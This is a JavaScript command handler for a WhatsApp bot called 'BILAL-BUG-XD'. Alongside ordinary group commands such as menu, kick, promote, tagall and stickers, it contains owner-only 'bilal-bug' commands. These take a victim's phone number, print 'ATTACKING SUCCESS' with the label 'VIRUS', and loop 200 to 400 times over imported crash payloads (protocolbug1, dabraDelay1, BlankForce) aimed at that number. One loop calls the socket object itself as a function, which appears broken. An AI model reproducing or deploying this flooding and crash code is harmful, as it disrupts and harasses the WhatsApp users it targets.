const { default: baileys, proto, getContentType, generateWAMessage, generateWAMessageFromContent, generateWAMessageContent, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");
const { default: makeWaSocket } = require('@whiskeysockets/baileys');
const fs = require('fs');
const mime = require('mime-types');
const NodeCache = require('node-cache');
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const pino = require('pino')
const { performance } = require('perf_hooks');
const { writeFile, unlink } = require('fs/promises');
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const JavaScriptObfuscator = require('javascript-obfuscator');
const path = require('path');
const sharp = require('sharp');
const ffmpeg = require('fluent-ffmpeg');
const cheerio = require('cheerio');
const { promisify } = require('util');
const gis = promisify(require('g-i-s'));
const { getBuffer, getGroupAdmins, getSizeMedia, formatSize, checkBandwidth, formatp, fetchJson, reSize, sleep, isUrl, runtime } = require('./database/mylib');

const { devaskNotBot, dabraDelay1, BlankForce, protocolbug1 } = require('./database/bug');

// Variables globales (à adapter selon votre config)
const global = {
    prefix: ".",
    owner: "24165726941", // Remplacez par votre numéro
    mode: "public",
    packname: "BILAL-BUG-XD",
    author: "BILEL KING"
};

const owner2 = [global.owner + "@s.whatsapp.net"];
const mess = {
    admin: "🚫 *Only administrators can use this command.*",
    group: "❌ *This command is for groups only.*",
    owner: "🔒 *This command is for owner only.*"
};

module.exports = async (devaskNotBot, m, msg, store) => { 
    try {   
        // Get command text
        let body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "interactiveResponseMessage" ? (() => {
                try {
                    return JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id;
                } catch {
                    return "";
                }
            })() :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "messageContextInfo" ?
                m.message.buttonsResponseMessage?.selectedButtonId ||
                m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
                m.message.interactiveResponseMessage?.nativeFlowResponseMessage ||
                m.text :
            ""
        );

        if (!body) body = "";
        
        const sender = m.key.fromMe ? devaskNotBot.user.id.split(":")[0] + "@s.whatsapp.net" || devaskNotBot.user.id : m.key.participant || m.key.remoteJid;
        const prefix = ".";
        if (!body.startsWith(prefix)) return;  
        
        const isCreator = owner2.includes(m.sender) ? true : m.sender == global.owner + "@s.whatsapp.net" ? true : m.fromMe ? true : false;
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
        const args = body.trim().split(/ +/).slice(1);
        const text = args.join(" ");
        
        var crypto = require("crypto");
        const moment = require('moment-timezone');
        const time = moment().format("HH:mm:ss DD/MM");
        let { randomBytes } = require("crypto");
        const makeid = randomBytes(3).toString('hex');
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const botNumber = await devaskNotBot.decodeJid(devaskNotBot.user.id);
        const isGroup = m.chat.endsWith('@g.us');
        const senderNumber = m.sender.split('@')[0];
        const pushname = m.pushName || "No Name";
        const isBot = botNumber.includes(senderNumber);
        const groupMetadata = isGroup ? await devaskNotBot.groupMetadata(m.chat) : {};
        let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {};
        const groupName = isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const isBotAdmin = participant_bot?.admin !== null ? true : false;
        const isAdmin = participants?.find(p => p.id === m.sender)?.admin === "admin" ? true : false;

        // Vérification du mode public/privé
        if (!devaskNotBot.public) {
            if (!m.key.fromMe) return;
        }

        switch (command) {

            // ==================== MENU & INFORMATION ====================
            case 'menu': {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "📁", key: m.key } }); 
                try {
                    const categories = [
                        {
                            title: "MENU",
                            desc: `
╭━━━⊰menu⊱━━━╮
├ ◦ public
├ ◦ private
├ ◦ promote
├ ◦ demote
├ ◦ kick
├ ◦ tagall
├ ◦ ping
├ ◦ jid
├ ◦ sticker
├ ◦ welcome 
├ ◦ goodbey
╰━━━━━━━━━━━━━━━╯`,
                            button: { text: "CHANNEL", url: "https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G/488" },
                            image: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg"
                        },
                        {
                            title: "BUGMENU",
                            desc: `
╭━━━⊰bug-menu⊱━━━╮
├ ◦ bilal-bug
├ ◦ bilal-bug2
├ ◦ bilal-bug3
├ ◦ bilal-x-group
╰━━━━━━━━━━━━━━━╯`,
                            button: { text: "CHANNEL", url: "https://whatsapp.com/channel/0029Vaj3Xnu17EmtDxTNnQ0G/488" },
                            image: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg"
                        }
                    ];

                    // Generate carousel cards with CTA buttons
                    const carouselCards = await Promise.all(
                        categories.map(async (item, index) => {
                            const imageMsg = (
                                await generateWAMessageContent(
                                    { image: { url: item.image } },
                                    { upload: devaskNotBot.waUploadToServer }
                                )
                            ).imageMessage;

                            return {
                                header: {
                                    title: item.title,
                                    hasMediaAttachment: true,
                                    imageMessage: imageMsg
                                },
                                body: { text: item.desc },
                                footer: { text: `📖 Page ${index + 1} of ${categories.length}` },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "cta_url",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: item.button.text,
                                                url: item.button.url,
                                                merchant_url: item.button.url
                                            })
                                        }
                                    ]
                                }
                            };
                        })
                    );

                    // Build the carousel message
                    const carouselMessage = generateWAMessageFromContent(
                        m.chat,
                        {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2
                                    },
                                    interactiveMessage: {
                                        body: { text: "⿻l ꙰lBILAL⿻BUG-XD ꙰⿻" },
                                        footer: { text: "Swipe ⬅️➡️ to explore all commands" },
                                        carouselMessage: { cards: carouselCards }
                                    }
                                }
                            }
                        },
                        { quoted: m }
                    );

                    // Send carousel
                    await devaskNotBot.relayMessage(m.chat, carouselMessage.message, {
                        messageId: carouselMessage.key.id
                    });

                } catch (error) {
                    console.error("❌ Menu command error:", error);
                    await devaskNotBot.sendMessage(m.chat, { text: "⚠️ Failed to load menu. Please try again later." }, { quoted: m });
                }
            }
            break;

            case "ping": {
                const startTime = Date.now();
                await devaskNotBot.sendMessage(m.chat, { text: 'Pong 🧃!' }, { quoted: m });

                const latency = Date.now() - startTime;
                await devaskNotBot.sendMessage(m.chat, { text: `BILAL BUG XD :\n> ${latency}Ms` }, { quoted: m });   
            }
            break;

            // ==================== GROUP MANAGEMENT ====================
            case "welcome": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, {
                    text: "❌ *This command is for groups only.*"
                }, { quoted: m });

                const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
                const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

                if (!isAdmin) return devaskNotBot.sendMessage(m.chat, {
                    text: "🚫 *Only administrators can use this command.*"
                }, { quoted: m });

                global.db = global.db || {};
                global.db.welcome = global.db.welcome || {};

                const arg = text?.toLowerCase();
                if (!["on", "off"].includes(arg)) {
                    return devaskNotBot.sendMessage(m.chat, {
                        text: `📌 *Usage:* ${prefix}welcome on/off`
                    }, { quoted: m });
                }

                const enable = arg === "on";
                global.db.welcome[m.chat] = enable;

                await devaskNotBot.sendMessage(m.chat, {
                    text: `👋 *Welcome message ${enable ? "enabled ✅" : "disabled ❌"}*`
                }, { quoted: m });

                // Built-in event for automatic sending
                devaskNotBot.ev.on('group-participants.update', async (update) => {
                    try {
                        const isWelcomeEnabled = global.db?.welcome?.[update.id];
                        if (!isWelcomeEnabled) return;

                        const metadata = await devaskNotBot.groupMetadata(update.id);

                        for (const participant of update.participants) {
                            if (update.action === 'add') {
                                const ppUser = await devaskNotBot.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
                                const username = participant.split('@')[0];
                                const groupName = metadata.subject;

                                const welcomeText = `🎉 *Welcome to @${username} in the group ${groupName}!*\n\n💬 Introduce yourself or get to know the members!`;

                                await devaskNotBot.sendMessage(update.id, {
                                    image: { url: ppUser },
                                    caption: welcomeText,
                                    mentions: [participant]
                                });
                            }
                        }
                    } catch (err) {
                        console.log("Welcome error:", err);
                    }
                });
            } 
            break;

            case "goodbye": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, {
                    text: "❌ *This command is for groups only.*"
                }, { quoted: m });

                const groupAdmins = groupMetadata.participants?.filter(p => p.admin)?.map(p => p.id) || [];
                const isAdmin = groupAdmins.includes(m.sender) || m.key.fromMe;

                if (!isAdmin) return devaskNotBot.sendMessage(m.chat, {
                    text: "🚫 *Only administrators can use this command.*"
                }, { quoted: m });

                global.db = global.db || {};
                global.db.goodbye = global.db.goodbye || {};

                const arg = text?.toLowerCase();
                if (!["on", "off"].includes(arg)) {
                    return devaskNotBot.sendMessage(m.chat, {
                        text: `📌 *Usage:* ${prefix}goodbye on/off`
                    }, { quoted: m });
                }

                const enable = arg === "on";
                global.db.goodbye[m.chat] = enable;

                await devaskNotBot.sendMessage(m.chat, {
                    text: `👋 *Goodbye message ${enable ? "enabled ✅" : "disabled ❌"}*`
                }, { quoted: m });

                // Built-in event for automatic sending
                devaskNotBot.ev.on('group-participants.update', async (update) => {
                    try {
                        const isGoodbyeEnabled = global.db?.goodbye?.[update.id];
                        if (!isGoodbyeEnabled) return;

                        const metadata = await devaskNotBot.groupMetadata(update.id);

                        for (const participant of update.participants) {
                            if (update.action === 'remove') {
                                const ppUser = await devaskNotBot.profilePictureUrl(participant, 'image').catch(() => 'https://i.ibb.co/rb6X4jQ/default.jpg');
                                const username = participant.split('@')[0];
                                const groupName = metadata.subject;

                                const goodbyeText = `😢 *@${username} left the group ${groupName}...*\n\nWe hope to see you again soon!`;

                                await devaskNotBot.sendMessage(update.id, {
                                    image: { url: ppUser },
                                    caption: goodbyeText,
                                    mentions: [participant]
                                });
                            }
                        }
                    } catch (err) {
                        console.log("Goodbye error:", err);
                    }
                });
            }
            break;

            case "promote":
            case "promot": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: "For groups only" }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: "Command reserved for group administrators only" }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: "The bot is not administrator" }, { quoted: m });

                if (m.quoted || text) {
                    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    await devaskNotBot.groupParticipantsUpdate(m.chat, [target], 'promote')
                    .then((res) => devaskNotBot.sendMessage(m.chat, { text: `User ${target.split("@")[0]} is now administrator` }, { quoted: m }))
                    .catch((err) => devaskNotBot.sendMessage(m.chat, { text: err.toString() }, { quoted: m }));
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: "Example: 241XXX/@tag" }, { quoted: m });
                }
            }
            break; 

            case "demote": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: "Group Only" }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: "Admin Only" }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: "The bot is not administrator in this group" }, { quoted: m });

                if (m.quoted || text) {
                    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    await devaskNotBot.groupParticipantsUpdate(m.chat, [target], 'demote')
                    .then((res) => devaskNotBot.sendMessage(m.chat, { text: `Member ${target.split("@")[0]} is no longer administrator in this group` }, { quoted: m }))
                    .catch((err) => devaskNotBot.sendMessage(m.chat, { text: err.toString() }, { quoted: m }));
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: "Example: 241XX" }, { quoted: m });
                }
            }
            break;

            case "open": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: 'For groups only' }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: 'the bot is not admin' }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                await devaskNotBot.groupSettingUpdate(m.chat, 'not_announcement');
                devaskNotBot.sendMessage(m.chat, { text: "*GROUP SETTINGS CHANGED ✅*\neveryone can send messages in the group" }, { quoted: m });
            }
            break;

            case "close": {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: mess.group }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: 'you are not admin' }, { quoted: m });
                if (!isAdmin && !isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                await devaskNotBot.groupSettingUpdate(m.chat, 'announcement');
                devaskNotBot.sendMessage(m.chat, { text: "*GROUP SETTINGS SUCCESSFULLY CHANGED ✅*\nonly admins can send messages" }, { quoted: m });
            }
            break;

            case 'kick': {
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: 'For groups only' }, { quoted: m });
                if (!isCreator && !isAdmin) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                if (!isBotAdmin) return devaskNotBot.sendMessage(m.chat, { text: "✖️ *The bot must be administrator*" }, { quoted: m });

                if (text || m.quoted) {
                    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
                    var onWa = await devaskNotBot.onWhatsApp(input.split("@")[0]);

                    if (onWa.length < 1) return devaskNotBot.sendMessage(m.chat, { text: "Number not registered on WhatsApp" }, { quoted: m });

                    const res = await devaskNotBot.groupParticipantsUpdate(m.chat, [input], 'remove');
                    await devaskNotBot.sendMessage(m.chat, { text: `Success: ${input.split("@")[0]} has been kicked from the group` }, { quoted: m });
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: "Send the command with text:\n.kick @tag/reply" }, { quoted: m });
                }
            }
            break;

            case "tagall":
            case "tag": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "📣", key: m.key } });

                if (!isCreator && !isAdmin) return devaskNotBot.sendMessage(m.chat, { text: mess.admin }, { quoted: m });
                if (!isGroup) return devaskNotBot.sendMessage(m.chat, { text: mess.group }, { quoted: m });

                let teks = "*BILAL-BUG-XD*\n" +
                    `*Message* : ${text ? text : ''}\n╭──♕ BILAL-BUG-XD ♕ ──╮\n`;

                for (let mem of participants) {
                    teks += `│ ❖ @${mem.id.split('@')[0]}\n`;
                }
                teks += `╰━━━━━━━━━━━━━━━╯`;
                
                // Send message with image
                await devaskNotBot.sendMessage(m.chat, {
                    image: { url: 'https://i.ibb.co/qYG993MS/72a4e407f204.jpg' },
                    caption: teks,
                    mentions: participants.map(a => a.id)
                }, { quoted: m });
            }
            break;

            // ==================== MEDIA & STICKERS ====================
            case 'sticker': 
            case 's': {
                if (!quoted) return devaskNotBot.sendMessage(m.chat, { text: `Reply Image or Video with command ${prefix + command}` }, { quoted: m });

                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await devaskNotBot.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                    await fs.unlinkSync(encmedia);
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 17) return devaskNotBot.sendMessage(m.chat, { text: 'max 17s' }, { quoted: m });

                    let media = await quoted.download();
                    let encmedia = await devaskNotBot.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                    await fs.unlinkSync(encmedia);
                } else {
                    return devaskNotBot.sendMessage(m.chat, { text: `Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s` }, { quoted: m });
                }
            }
            break;

            // ==================== BOT OWNER & SPECIAL ====================
            case 'bilal-bug': {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                if (!text) return devaskNotBot.sendMessage(m.chat, { text: "241xxx or tag @user" }, { quoted: m });

                let mentionedJid;
                let lockNum;
                if (m.mentionedJid?.length > 0) {
                    mentionedJid = m.mentionedJid[0];
                    lockNum = mentionedJid.split('@')[0];
                } else {
                    let jidx = text.replace(/[^0-9]/g, "");
                    if (jidx.startsWith('0')) return devaskNotBot.sendMessage(m.chat, { text: 'use command + 241xxxx' }, { quoted: m });
                    mentionedJid = `${jidx}@s.whatsapp.net`;
                    lockNum = `${jidx}`;
                }
                let target = mentionedJid;
                let lock = lockNum;
                let teks = `「 ATTACKING SUCCESS 」\n\n𖥂 TARGET : *${lock}*\n𖥂 VIRUS : *${command}*\n\n\`—( Note )\`\n> Please pause after sending bug`;
                await devaskNotBot.sendMessage(m.chat, { text: teks }, { quoted: m });

                for (let i = 0; i < 400; i++) {
                    console.log(chalk.green(`© - Invisible\n𖥂 Protocolbug1 : ${i}/400\n𖥂 Target : ${target}`));
                    await protocolbug1(devaskNotBot, target, false);
                }
            }
            break;

            case 'bilal-bug2': {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                if (!text) return devaskNotBot.sendMessage(m.chat, { text: "241xxx or tag @user" }, { quoted: m });

                let mentionedJid;
                let lockNum;
                if (m.mentionedJid?.length > 0) {
                    mentionedJid = m.mentionedJid[0];
                    lockNum = mentionedJid.split('@')[0];
                } else {
                    let jidx = text.replace(/[^0-9]/g, "");
                    if (jidx.startsWith('0')) return devaskNotBot.sendMessage(m.chat, { text: 'use command + 241xxxx' }, { quoted: m });
                    mentionedJid = `${jidx}@s.whatsapp.net`;
                    lockNum = `${jidx}`;
                }
                let target = mentionedJid;
                let lock = lockNum;
                let teks = `「 ATTACKING SUCCESS 」\n\n𖥂 TARGET : *${lock}*\n𖥂 VIRUS : *${command}*\n\n\`—( Note )\`\n> Please pause after sending bug`;
                await devaskNotBot.sendMessage(m.chat, { text: teks }, { quoted: m });

                for (let i = 0; i < 400; i++) {
                    console.log(chalk.green(`© - Invisible\n𖥂 Protocolbug1 : ${i}/400\n𖥂 Target : ${target}`));
                    await dabraDelay1(devaskNotBot, target, false);
                    await BlankForce(devaskNotBot, target, false);
                }
            }
            break;

            case 'bilal-bug3': {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                if (!text) return devaskNotBot.sendMessage(m.chat, { text: "241xxx or tag @user" }, { quoted: m });

                let mentionedJid;
                let lockNum;
                if (m.mentionedJid?.length > 0) {
                    mentionedJid = m.mentionedJid[0];
                    lockNum = mentionedJid.split('@')[0];
                } else {
                    let jidx = text.replace(/[^0-9]/g, "");
                    if (jidx.startsWith('0')) return devaskNotBot.sendMessage(m.chat, { text: 'use command + 241xxxx' }, { quoted: m });
                    mentionedJid = `${jidx}@s.whatsapp.net`;
                    lockNum = `${jidx}`;
                }
                let target = mentionedJid;
                let lock = lockNum;
                let teks = `「 ATTACKING SUCCESS 」\n\n𖥂 TARGET : *${lock}*\n𖥂 VIRUS : *${command}*\n\n\`—( Note )\`\n> Please pause after sending bug`;
                await devaskNotBot.sendMessage(m.chat, { text: teks }, { quoted: m });

                for (let i = 0; i < 200; i++) {
                    console.log(chalk.green(`© - Invisible\n𖥂 bug : ${i}/400\n𖥂 Target : ${target}`));
                    await devaskNotBot(devaskNotBot, target, false);
                    await BlankForce(devaskNotBot, target, false);
                    await dabraDelay1(devaskNotBot, target, false);
                }
            }
            break;

            case "jid": {
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: mess.owner }, { quoted: m });
                devaskNotBot.sendMessage(m.chat, { text: `BILAL BUG XD\n𝖸𝖮𝖴𝖱 𝖩𝖨𝖣 😋 ${m.chat}` }, { quoted: m });
            }
            break;

            case "private": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "🔒", key: m.key } });
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: 'For Owner Only' }, { quoted: m });
                devaskNotBot.public = false;
                devaskNotBot.sendMessage(m.chat, { text: 'PRIVATE MODE ACTIVATED' }, { quoted: m });
            }
            break;

            case "public": {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "🔓", key: m.key } });
                if (!isCreator) return devaskNotBot.sendMessage(m.chat, { text: 'For Owner Only' }, { quoted: m });
                devaskNotBot.public = true;
                devaskNotBot.sendMessage(m.chat, { text: 'PUBLIC MODE ACTIVATED' }, { quoted: m });
            }
            break;

            // ==================== DEFAULT HANDLER ====================
            default: {
                await devaskNotBot.sendMessage(m.chat, { react: { text: "❌", key: m.key } });

                await devaskNotBot.sendMessage(m.chat, {
                    image: { url: "https://i.ibb.co/qYG993MS/72a4e407f204.jpg" },
                    caption: "> Command not recognized, type *.menu* to see available options."
                }, { quoted: m });
            }
            break;
        }
    } catch (err) {        
        console.log(chalk.red("Error in handler.js =>"), err);
    }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.whiteBright('├'), chalk.keyword("red")("[ UPDATE ]"), __filename);
    delete require.cache[file];
    require(file);
});